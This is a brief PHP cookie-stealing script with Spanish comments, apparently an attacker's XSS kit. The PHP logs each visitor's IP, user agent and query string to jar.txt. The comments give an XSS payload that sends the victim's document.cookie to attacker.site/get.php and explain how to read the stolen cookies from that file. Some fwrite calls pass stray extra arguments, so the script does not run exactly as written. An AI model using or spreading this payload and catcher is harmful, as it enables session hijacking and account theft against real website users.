<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp,$ip,' ',$browser," \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']), " \n\n");
fclose($fp);
?>

// http://attacker.site/get.php?test=misdatos
//para ver las cookies debemos cargar en la web /jar.txt
// luego en la pagina vulnerable ejecurtar el payload
//<script> var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
